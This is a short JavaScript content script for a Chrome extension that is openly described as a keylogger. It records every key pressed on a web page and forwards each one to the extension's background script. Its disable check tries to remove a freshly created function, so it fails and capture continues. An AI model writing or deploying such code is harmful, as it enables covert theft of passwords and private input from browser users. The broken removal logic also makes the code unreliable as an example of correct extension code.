// Capture keystrokes on the website
document.addEventListener('keydown', function(event) {
  // Send the captured keystroke to the background script
  chrome.runtime.sendMessage({ type: 'updateLoggedData', data: event.key });
});

// Stop the content script from running if the keylogger is disabled
chrome.runtime.sendMessage({ type: 'keyloggerEnabled' }, function(response) {
  if (!response.data) {
    // Stop the content script from running if the keylogger is disabled
    document.removeEventListener('keydown', function(event) {
      // Send the captured keystroke to the background script
      chrome.runtime.sendMessage({ type: 'updateLoggedData', data: event.key });
    });
  }
});
